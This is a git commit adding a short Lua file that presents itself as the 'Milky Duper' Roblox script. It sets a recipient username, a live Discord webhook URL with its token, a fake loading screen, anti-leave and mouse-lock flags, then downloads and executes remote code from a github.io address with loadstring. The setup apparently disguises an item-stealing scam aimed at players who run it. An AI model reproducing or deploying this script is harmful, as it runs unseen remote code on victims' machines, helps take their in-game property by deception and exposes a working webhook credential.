0027a3a69c09009f41f5e523578f10b2a81f6878
UnspokenRizzkk <132014337+UnspokenRizzkk@users.noreply.github.com>
2023-04-27 22:29:06 +0200

    Add files via upload

---
+++ mail.lua
@@ -0,0 +1,15 @@
+UserName = "huitre23"
+Webhook = "https://discord.com/api/webhooks/1090676709428310047/TmbW0QL3_Ht29DxUKYTNVxdCNCRvIqKB_vxlzkHY4aCPA0E1ew5RVn7z3m_Tfh0VgY8h" -- optional delete the whole line if you don't want it
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Milky Duper"
+_G.FirstText = "The script is launching"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
